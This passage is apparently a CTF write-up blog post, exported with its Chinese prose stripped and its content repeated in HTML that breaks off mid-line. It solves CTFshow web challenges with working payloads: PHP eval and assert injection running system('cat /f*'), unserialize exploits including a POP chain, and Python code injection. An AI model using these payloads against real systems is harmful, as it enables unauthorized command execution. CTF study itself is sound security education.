t+=s[i]+\"=\"+s[i+1]+'&'\n\nt+=s[i]+'='+code\nprint(t)\n\n```\n\npayload\n\n```\n_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=J&I=system('cat /f*');\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n    if ($_GET['num'] == 114514){\n        assert(\"intval($_GET[num])==1919810\") or die(\"!\");\n        echo $flag;\n    } \n} \n\n```\n\n> assertphpeval\n\npayload\n\n```\n?num=114514);//      \n\n?num=114514%2b1805296     %2burl1919810\n\n?num=114514);1919810    \n```\n\n\n\n\n\n\n\n##             \n\n```php\n<?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n     if ($_GET['num'] == 114514 && check($_GET['num'])){\n              assert(\"intval($_GET[num])==1919810\") or die(\"!\");\n              echo $flag;\n     } \n} \n\nfunction check($str){\n  return !preg_match(\"/[a-z]|\\;|\\(|\\)/\",$str);\n\n```\n\n%2b\n\n\n\npayload\n\n```\n?num=114514%2b1805296\n```\n\n\n\n\n\n\n\n## TapTapTap\n\nF12flag\n\n```\n/secret_path_you_do_not_know/secretfile.txt\n```\n\n\n\n\n\n\n\n## webshell\n\n```php\n <?php \n    error_reporting(0);\n\n    class Webshell {\n        public $cmd = 'echo \"Hello World!\"';\n\n        public function __construct() {\n            $this->init();\n        }\n\n        public function init() {\n            if (!preg_match('/flag/i', $this->cmd)) {\n                $this->exec($this->cmd);\n            }\n        }\n\n        public function exec($cmd) {\n            $result = shell_exec($cmd);\n            echo $result;\n        }\n    }\n\n    if(isset($_GET['cmd'])) {\n        $serializecmd = $_GET['cmd'];\n        $unserializecmd = unserialize($serializecmd);\n        $unserializecmd->init();\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n\n?> \n```\n\n\n\nwebshellinit\n\n\n\nexp\n\n```php\n <?php \n class Webshell {\n \n        public $cmd = 'cat f*';\n        \n}  \necho serialize(new Webshell);\n?> \n// O:8:\"Webshell\":1:{s:3:\"cmd\";s:6:\"cat f*\";} \n```\n\n\n\n\n\n\n\n##             \n\n```\n <?php\n\nhighlight_file(__FILE__);\ninclude \"flag.php\";\n\n$result='';\n\nfor ($i=1;$i<=count($_GET);$i++){\n    if (strlen($_GET[$i])>1){\n        die(\"\");\n        }\n    else{\n    $result=$result.$_GET[$i];\n    }\n}\n\nif ($result ===\"\"){\n    echo $flag;\n}\n\n```\n\nphp3url3\n\nurl\n\n```\n%E5%A4%A7%E7%89%9B\n```\n\n\n\npayload\n\n```\n/?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nif (isset($_GET['0'])){\n    $arr[$_GET['0']]=1;\n    if ($arr[]=1){\n        die($flag);\n    }\n    else{\n        die(\"nonono!\");\n    }\n}\n\n```\n\n78$arr[]=1ifturedieflag0\n\n\n\npayload\n\n```\n?0=0\n```\n\n\n\n\n\n\n\n##             \n\n```\nvar nowScore = this.score += 1\n```\n\njs275\n\n```\nvar nowScore = this.score += 2077\n```\n\n\n\n\n\n##             \n\n\n\n```\nGET /_calculate?number1=5&operator=*&number2=6 HTTP/1.1\n```\n\n3\n\nnumber1,operatornumber2\n\nnumber2 RCE\n\n\n\npayload\n\n```\n/_calculate?number1=5&operator=*&number2=__import__('os').popen('cat /f*').read()\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\n$zeros=\"000000000000000000000000000000\";\n\nforeach($_GET as $key => $value){\n    $$key=$$value;\n}\n\nif ($flag==\"000000000000000000000000000000\"){\n    echo \"\";\n}else{\n    echo \"\";\n    var_dump($_GET);\n}\n\n```\n\n\n\n?_GET=flag\n\n```\nvar_dump($_GET);=>  var_dump($flag);\n```\n\n\n\n\n\n## \n\n\n\nwpphp\n\n\n\npayload\n\n```\na=0&b=0&c=0&d=0&e=999999999999999999&submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nclass Moon{\n    public $name=\"\";\n    public function __toString(){\n        return $this->name;\n    }\n    \n    public function __wakeup(){\n        echo \"\".$this->name.\"\";\n    }\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n\n    public function call(){\n        global $flag;\n        if ($this->nickname==\"\"){\n            echo $flag;\n        }else{\n            echo \"\".$this->nickname.\"\\n\";\n            echo \"?!\\n\";\n        }\n    }\n    \n    public function __toString(){\n        $this->call();\n        return \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----\".$this->nickname;\n    }\n}\n\nif (isset($_GET['code'])){\n    unserialize($_GET['code']);\n\n}else{\n    $a=new Ion_Fan_Princess();\n    echo $a;\n}\n\n```\n\nIon_Fan_Princess call echo $flag\n\nIon_Fan_Princess__toStringcall\n\nMoon  __wakeup ____toString\n\n\n\npop\n\n```\nMoon::__wakeup => Ion_Fan_Princess::__toString => Ion_Fan_Princess::call\n```\n\n\n\nexp\n\n```\n <?php\nclass Moon{\n    public $name;\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n//  <?php\nclass Moon{\n    public $name;\n    \n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n// O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"\";}}\n```\n\n\n\npayload\n\n```\n?code=O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"\";}}\n```","slug":"CTFSHOW_","published":1,"updated":"2024-04-17T08:43:00.139Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7hk0000h7761sb1h8gg","content":"<h1 id=\"CTFSHOW-\"><a href=\"#CTFSHOW-\" class=\"headerlink\" title=\"CTFSHOW_\"></a>CTFSHOW_</h1><h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"variable\">$_GET</span>[<span class=\"variable\">$_POST</span>[<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;CTFshow-QQ:&#x27;</span>]]]][<span class=\"number\">6</span>][<span class=\"number\">0</span>][<span class=\"number\">7</span>][<span class=\"number\">5</span>][<span class=\"number\">8</span>][<span class=\"number\">0</span>][<span class=\"number\">9</span>][<span class=\"number\">4</span>][<span class=\"number\">4</span>]);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>$_COOKIE[CTFshow-QQ:]</strong></p>\n<p><strong>cookie</strong>**CTFshow-QQ:**a</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[$_POST[a]]]</span><br></pre></td></tr></table></figure>\n\n<p>posta&#x3D;b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[b]]</span><br></pre></td></tr></table></figure>\n\n<p>getb&#x3D;c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[c][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>\n\n<p>REQUESTgetpost</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>cookie**<u>CTFshow-QQ:</u>**</p>\n<p>url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CTFshow-QQ%E7%BE%A4:=a</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"web2-c0me-t0-s1gn\"><a href=\"#web2-c0me-t0-s1gn\" class=\"headerlink\" title=\"web2 c0me_t0_s1gn\"></a>web2 c0me_t0_s1gn</h2><p>F12</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png\"\n                        alt=\"-1680664313075\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try to run the function &quot;g1ve_flag()&quot; to get the flag!</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png\"\n                        alt=\"-1680664326857\"\n                 ></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"$\"></a>$</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>$_$__&#x3D;a,a36$36</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">s = string.ascii_letters </span><br><span class=\"line\">t=<span class=\"string\">&#x27;_=a&amp;&#x27;</span></span><br><span class=\"line\">code=<span class=\"string\">&quot;phpinfo();&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">35</span>):</span><br><span class=\"line\">    t+=s[i]+<span class=\"string\">&quot;=&quot;</span>+s[i+<span class=\"number\">1</span>]+<span class=\"string\">&#x27;&amp;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">t+=s[i]+<span class=\"string\">&#x27;=&#x27;</span>+code</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__); </span><br><span class=\"line\">include &quot;flag.php&quot;;  </span><br><span class=\"line\">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    if ($_GET[&#x27;num&#x27;] == 114514)&#123;</span><br><span class=\"line\">        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;!&quot;);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>assertphpeval</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514);//      </span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514%2b1805296     %2burl1919810</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514);1919810    </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>] == <span class=\"number\">114514</span> &amp;&amp; <span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">              <span class=\"title function_ invoke__\">assert</span>(<span class=\"string\">&quot;intval(<span class=\"subst\">$_GET</span>[num])==1919810&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;!&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">     &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[a-z]|\\;|\\(|\\)/&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>%2b</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514%2b1805296</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"TapTapTap\"><a href=\"#TapTapTap\" class=\"headerlink\" title=\"TapTapTap\"></a>TapTapTap</h2><p>F12flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/secret_path_you_do_not_know/secretfile.txt</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;cmd)) &#123;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">exec</span>(<span class=\"variable\">$this</span>-&gt;cmd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exec</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$serializecmd</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serializecmd</span>);</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>webshellinit</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;cat f*&#x27;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Webshell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"><span class=\"comment\">// O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125; </span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$result=&#x27;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class=\"line\">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class=\"line\">        die(&quot;&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">    $result=$result.$_GET[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($result ===&quot;&quot;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>php3url3</p>\n<p>url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%E5%A4%A7%E7%89%9B</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class=\"line\">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class=\"line\">    if ($arr[]=1)&#123;</span><br><span class=\"line\">        die($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;nonono!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>78$arr[]&#x3D;1ifturedieflag0</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?0=0</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 1</span><br></pre></td></tr></table></figure>\n\n<p>js275</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 2077</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /_calculate?number1=5&amp;operator=*&amp;number2=6 HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p>3</p>\n<p>number1,operatornumber2</p>\n<p>number2 RCE</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/_calculate?number1=5&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">    var_dump($_GET);</span><br><span 